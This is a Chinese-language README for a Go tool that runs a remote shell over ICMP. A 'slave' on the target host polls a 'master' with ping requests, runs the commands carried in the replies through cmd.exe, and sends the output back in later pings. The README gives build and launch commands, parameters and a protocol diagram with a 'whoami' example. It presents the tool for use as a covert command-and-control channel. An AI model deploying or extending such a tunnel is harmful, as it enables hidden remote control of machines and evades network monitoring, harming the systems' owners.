# ICMP

## 前置条件

- 在 Windows 上安装可用的 `Npcap` 或 `WinPcap` 驱动，`gopacket/pcap` 依赖它抓包和发包。
- 以管理员权限运行程序，否则打开网卡、设置 BPF 或发送原始数据包可能失败。
- 在项目根目录 `d:\code\protocol` 下执行以下命令。

## 编译

```bash
# 统一编译为一个命令
go build -o icmp.exe ./icmp
```

如果依赖缺失，先执行：

```bash
go mod tidy
```

## 运行

### Master 端

```bash
.\icmp.exe master -src 192.168.1.10 -dst 192.168.1.20
```

参数说明：

- `-src`：本机用于监听和回复的 IP 地址。
- `-dst`：对端 `slave` 主机的 IP 地址。

### Slave 端

```bash
.\icmp.exe slave -t 192.168.1.10
```

参数说明：

- `-t`：`master` 主机 IP，必填。
- `-d`：两次轮询间隔，单位毫秒，默认 `200`。
- `-o`：等待 Echo Reply 的超时时间，单位毫秒，默认 `3000`。
- `-s`：每次从 `cmd.exe` 读取输出的缓冲区大小，单位字节，默认 `64`。
- `-r`：测试模式开关，当前代码已保留参数，但还没有单独实现测试模式逻辑。
- `-b`：最大空白轮询次数参数，当前代码已保留参数，但还没有实际使用。

## 联调步骤

1. 在控制端启动 `master` 子命令，指定本机 IP 和目标 `slave` IP。
2. 在目标机启动 `slave` 子命令，`-t` 指向 `master` IP。
3. `slave` 会周期性发送 ICMP Echo Request 拉取命令。
4. `master` 收到请求后，会先打印请求 payload 中携带的命令执行结果，再把本地输入作为 Echo Reply payload 回给 `slave`。
5. `slave` 收到 Echo Reply 后，把 payload 写入 `cmd.exe`，并在下一次 Echo Request 中把输出结果带回。

## 协议流程

```text
  [Master]                                                  [Slave]
  被动监听 ICMP Echo Request                                 周期性轮询并接管 cmd.exe
       |                                                           |
       |<==========================================================|
       | 1. 发起轮询                                                |
       |    Echo Request (Type 8)                                  |
       |    Data: 上一条命令的执行结果或空数据                     |
       |                                                           |
       | 2. 打印请求里的 payload                                    |
       |    读取本地输入，例如 whoami                               |
       |                                                           |
       |===========================================================>|
       | 3. 下发命令                                                |
       |    Echo Reply (Type 0)                                    |
       |    Data: "whoami"                                         |
       |                                                           |
       |                                               4. 把 payload 写入 cmd.exe
       |                                               5. 读取执行结果
       |                                                           |
       |<==========================================================|
       | 6. 下一次轮询携带执行结果                                  |
       |    Echo Request (Type 8)                                  |
       |    Data: "administrator\r\n"                              |
       |                                                           |
       v                                                           v
    循环等待下一条请求                                          循环轮询下一条命令


## 故障排查

- 参数帮助：可执行 `.\icmp.exe -h`、`.\icmp.exe master -h` 或 `.\icmp.exe slave -h` 查看子命令用法。
- `打开网卡失败` 或 `设置BPF过滤器失败`：通常是权限不足，或本机没有正确安装 `Npcap/WinPcap`。
- 一直 `timeout`：检查 `-t`、`-src`、`-dst` 是否填写正确，确认两端网络可达且没有被防火墙拦截 ICMP。
- 看不到回显结果：确认 `master` 和 `slave` 的 IP 对应关系填写正确，并确保 `master` 正在监听来自 `slave` 的 Echo Request。
